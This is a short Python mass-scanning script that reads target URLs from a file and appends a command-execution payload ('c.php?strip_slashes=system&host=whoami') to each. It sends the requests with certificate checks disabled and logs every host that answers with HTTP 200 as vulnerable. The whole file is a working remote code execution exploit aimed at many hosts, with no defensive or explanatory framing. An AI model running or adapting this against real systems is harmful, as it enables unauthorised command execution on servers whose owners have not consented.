#!/usr/bin/enc python
# _*_ coding: utf-8 _*_

import requests
import os
import sys
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

file = str(sys.argv[1])
write = sys.argv[2]
duwenjian = open(file , 'r' , encoding='UTF-8')
xiewenjian = open(write , 'w')
ff = duwenjian.readlines()

def webhttp():
    for line in ff:
        try:
            line = line.rstrip("\n")
            payload = "/tool/log/c.php?strip_slashes=system&host=whoami"
            url = line + payload
            qingqiu = requests.get(url, verify=False, timeout=1)
            zhuangtai = qingqiu.status_code
            if zhuangtai == 200 :
                print(url)
                xiewenjian.write(url)
                xiewenjian.write('\n')
            else :
                pass
        except OSError:
            pass

def main():
    f = threading.Thread(target=webhttp)
    f.start()
    f.join()
    duwenjian.close()
    xiewenjian.close()

if __name__=="__main__":
    main()